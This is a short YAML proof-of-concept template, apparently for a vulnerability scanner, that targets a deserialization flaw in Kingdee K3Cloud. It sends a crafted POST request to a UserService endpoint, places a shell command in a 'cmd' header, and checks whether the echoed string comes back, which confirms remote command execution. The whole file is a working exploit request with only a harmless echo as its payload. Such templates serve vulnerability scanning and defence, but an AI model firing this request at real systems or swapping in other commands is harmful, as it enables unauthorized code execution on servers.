name: poc-yaml-kingdee-cloud-user-deserialization-vuln
rules:
  - method: POST
    path: "/K3Cloud/Kingdee.BOS.ServiceFacade.ServicesStub.User.UserService.SaveUserPassport.common.kdsvc"
    headers:
      Content-Type: text/json
      cmd: echo 66666yyds
    body: |
      {"ap0":""}
    expression: |
      response.status == 200 && response.body.bcontains(b"66666yyds")
detail:
  author: yishuizhe
  name: Kingdee Cloud User Deserialization Vulnerability